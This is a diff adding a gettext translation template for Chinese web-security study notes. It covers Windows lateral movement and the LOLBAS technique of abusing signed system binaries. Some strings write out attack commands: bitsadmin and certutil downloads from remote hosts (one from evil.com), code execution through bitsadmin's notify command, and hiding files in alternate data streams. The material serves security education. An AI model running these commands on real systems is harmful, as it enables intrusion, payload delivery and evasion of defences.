@@ -1,0 +1,352 @@
+# SOME DESCRIPTIVE TITLE.
+# Copyright (C) 2019-2026, Lyle
+# This file is distributed under the same license as the Web安全学习笔记 package.
+# FIRST AUTHOR <EMAIL@ADDRESS>, 2026.
+#
+msgid ""
+msgstr ""
+"Project-Id-Version: Web安全学习笔记 1.0\n"
+"Report-Msgid-Bugs-To: \n"
+"POT-Creation-Date: 2026-06-17 07:02+0800\n"
+"PO-Revision-Date: YEAR-MO-DA HO:MI+ZONE\n"
+"Last-Translator: FULL NAME <EMAIL@ADDRESS>\n"
+"Language: en\n"
+"Language-Team: en <LL@li.org>\n"
+"Plural-Forms: nplurals=2; plural=(n != 1);\n"
+"MIME-Version: 1.0\n"
+"Content-Type: text/plain; charset=utf-8\n"
+"Content-Transfer-Encoding: 8bit\n"
+"Generated-By: Babel 2.18.0\n"
+
+#: ../../source/intranet/windows/lateral.rst:2
+msgid "横向移动"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:5
+msgid "常见入口"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:6
+msgid "SMB弱密码"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:7
+msgid "SqlServer弱密码"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:10
+msgid "LOLBAS"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:13
+msgid "简介"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:14
+msgid ""
+"LOLBAS，全称Living Off The Land Binaries and Scripts (and also "
+"Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt "
+"Graeber发现，最终Philip Goh提出的概念。"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:16
+msgid "这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:19
+msgid "常见程序"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:20
+msgid "appsyncvpublishing.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:21
+msgid "执行powershell"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:22
+msgid "bitsadmin.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:23
+msgid ""
+"下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> "
+"<local_path>``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:24
+msgid ""
+"下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 "
+"https://evil.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe "
+"bitsadmin /RESUME 1 bitsadmin /complete 1``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:25
+msgid ""
+"复制文件 ``bitsadmin /create 1 & bitsadmin /addfile 1 "
+"c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin "
+"/RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:26
+msgid ""
+"代码执行 ``bitsadmin /create 1 & bitsadmin /addfile 1 "
+"c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin "
+"/SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin "
+"/RESUME 1 & bitsadmin /Reset``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:27
+msgid "cdb.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:28
+msgid "certutil.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:29
+msgid "可安装、备份、删除、管理和执行证书"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:30
+msgid "证书存储相关功能"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:31
+msgid "下载文件 ``certutil -urlcache -split -f https://addr/example.exe``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:32
+msgid "注意 certutil 是有cache的，需要显式删除"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:33
+msgid "base64 编解码 ``certutil -encode`` /  ``certutil -decode``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:34
+msgid "cmd.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:35
+msgid "cmstp.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:36
+msgid "control.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:37
+msgid ""
+"`加载dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-"
+"tools/>`_"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:38
+msgid "csc.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:39
+msgid "编译 C# 载荷"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:40
+msgid "cscript.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:41
+msgid "执行脚本"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:42
+msgid "extexport.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:43
+msgid "expand.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:44
+msgid "展开一个或多个压缩文件"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:45
+msgid "forfiles.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:46
+msgid "``forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:47
+msgid "mofcomp.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:48
+msgid "makecab.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:49
+msgid "msbuild.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:50
+msgid "构建应用程序"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:51
+msgid "mshta.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:52
+msgid "HTML应用"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:53
+msgid "msiexec.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:54
+msgid "安装msi"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:55
+msgid "加载dll"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:56
+msgid "msxsl.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:57
+msgid "处理XSL程序"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:58
+msgid "netsh.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:59
+msgid "installutil.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:60
+msgid "安装/卸载程序组件"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:61
+msgid "IEExec.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:62
+msgid ".NET Framework附带程序"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:63
+msgid "powershell.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:64
+msgid "psexec.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:65
+msgid "https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:66
+msgid "reg.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:67
+msgid "注册表控制台"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:68
+msgid "regedit.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:69
+msgid "注册表修改"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:70
+msgid "regsvr32.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:71
+msgid "注册动态链接库/ActiveX控件"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:72
+msgid "rundll32.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:73
+msgid "执行DLL文件中的内部函数"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:74
+msgid "sc.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:75
+msgid "查看服务状态管理"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:76
+msgid "schtasks.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:77
+msgid "定时计划任务"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:78
+msgid "shred"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:79
+msgid "重复写入文件，防止文件恢复"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:80
+msgid "type.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:81
+msgid "利用ads隐藏文件 ``type <filepath> <target_file:ads>``"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:82
+msgid "wmic.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:83
+msgid "Windows管理工具"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:84
+msgid "windbg.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:85
+msgid "winrm.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:86
+msgid "wscript.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:87
+msgid "脚本引擎"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:88
+msgid "waitfor.exe"
+msgstr ""
+
+#: ../../source/intranet/windows/lateral.rst:89
+msgid "用于同步网络中计算机，可以发送或等待系统上的信号。"
+msgstr ""
